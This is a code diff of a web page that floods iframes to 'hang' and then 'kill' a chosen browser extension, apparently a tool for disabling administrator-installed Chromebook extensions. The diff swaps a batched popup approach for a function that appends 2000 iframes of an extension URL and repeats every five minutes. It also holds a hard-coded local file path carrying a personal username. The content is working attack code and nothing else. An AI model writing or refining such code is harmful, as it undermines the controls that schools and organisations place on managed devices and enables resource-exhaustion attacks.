@@ -167,7 +167,7 @@
       <input type="range" id="iframeCountSlider" min="100" max="25000" value="2000" step="100" style="flex-grow: 1;">
       <span id="iframeCountValue">2000</span>
     </div>
-    <button onclick="warning();" id="hangButton">Hang Extension!</button>
+    <button onclick="startHanging();" id="hangButton">Hang Extension!</button>
     <button id="killButton" onclick="openExtensionPopup();">Kill Extension!</button>
   </div>
 
@@ -263,64 +263,39 @@
 
     populateSelectOptions();
 
-    function replaceIframes(container, iframeSrc, iframeCount) {
-      const batchSize = 1000; // Number of iframes to load in each batch
-      const loadBatch = (start) => {
-        requestAnimationFrame(() => {
-          for (let i = start; i < Math.min(start + batchSize, iframeCount); i++) {
-            const iframe = document.createElement('iframe');
-            iframe.src = iframeSrc;
-            iframe.style.width = '100%';
-            iframe.style.height = '100px';
-            iframe.loading = 'lazy'; // Lazy loading
-            container.appendChild(iframe);
-          }
-          if (start + batchSize < iframeCount) {
-            setTimeout(() => loadBatch(start + batchSize), 30); // Load next batch after a delay
-          }
-        });
-      };
-
-      loadBatch(0);
-      setTimeout(function () {
-        while (container.firstChild) {
-          container.removeChild(container.firstChild);
-        }
-        replaceIframes(container, iframeSrc, iframeCount);
-      }, 5000);
-    }
-
-    function warning() {
+    function startHanging() {
       const overlay = document.getElementById("overlay");
       overlay.style.display = "flex";
       const iframeSelect = document.getElementById("iframeSelect");
-      const selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
       const selectedSrc = iframeSelect.value;
-      const iframeCount = parseInt(document.getElementById("iframeCountSlider").value, 10);
-      const popup = window.open("", "PopupWindow", "width=100,height=100");
-      const popupDocument = popup.document;
-      const popupBody = popupDocument.body;
-      const iframeContainer = popupDocument.createElement('div');
-      iframeContainer.id = 'iframeContainer';
-      popupBody.appendChild(iframeContainer);
-      replaceIframes(iframeContainer, selectedSrc, iframeCount);
-      setTimeout(function () {
-        popup.close();
-        const killExtensionText = document.getElementById("killExtensionText");
-        killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
-        setTimeout(function () {
-          overlay.style.display = "none";
-          killExtensionText.style.display = "block";
-          document.getElementById("killButton").style.display = "inline-block";
-          document.getElementById("hangButton").style.display = "none";
-          document.getElementById("iframeSelect").style.display = "none";
-          document.getElementById("labelForIframeSelect").style.display = "none";
-          document.getElementById("iframeCountSlider").style.display = "none";
-          document.getElementById("iframeCountValue").style.display = "none";
-          document.getElementById("labelForIframeSlider").style.display = "none";
-          document.getElementById("killButton").setAttribute("data-url", selectedSrc);
-        }, 10000);
-      }, 5000);
+      const iframeCount = 2000;
+      const interval = 5 * 60 * 1000; // 5 minutes in milliseconds
+
+      function checkUrl() {
+        if (window.location.href === "file:///C:/Users/dalla/Downloads/index%20(18).html") {
+          clearInterval(iframeInterval);
+          return;
+        }
+      }
+
+      function createIframes() {
+        const container = document.createElement('div');
+        document.body.appendChild(container);
+        for (let i = 0; i < iframeCount; i++) {
+          const iframe = document.createElement('iframe');
+          iframe.src = selectedSrc;
+          iframe.style.width = '100%';
+          iframe.style.height = '100px';
+          iframe.loading = 'lazy'; // Lazy loading
+          container.appendChild(iframe);
+        }
+      }
+
+      createIframes();
+      const iframeInterval = setInterval(() => {
+        checkUrl();
+        createIframes();
+      }, interval);
     }
 
     function openExtensionPopup() {
